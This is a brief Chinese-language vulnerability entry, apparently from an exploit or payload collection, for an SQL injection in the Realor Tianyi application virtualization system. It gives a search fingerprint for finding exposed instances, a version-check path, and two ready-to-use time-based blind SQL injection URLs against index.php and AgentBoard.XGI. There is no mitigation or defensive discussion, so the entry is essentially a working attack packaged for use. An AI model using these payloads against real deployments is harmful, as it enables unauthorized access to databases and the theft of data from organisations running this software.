# 瑞友天翼应用虚拟化系统index.php存在SQL注入漏洞

瑞友天翼应用虚拟化系统 ｜ SQL注入 ｜ —
- **指纹**：`title="瑞友天翼－应用虚拟化系统"`

**Payload**
```
查询版本：
/RapAgent.xgi?CMD=GetRegInfo
漏洞地址：
/index.php?s=/Admin/appsave&appid=1%27%20AND%20(SELECT%207083%20FROM%20(SELECT(SLEEP(5)))bbHz)%20AND%20%27WazH%27=%27WazH
/AgentBoard.XGI?user=1%27%20AND%20(SELECT%207083%20FROM%20(SELECT(SLEEP(5)))bbHz)%20AND%20%27WazH%27=%27WazH&cmd=UserLogin
```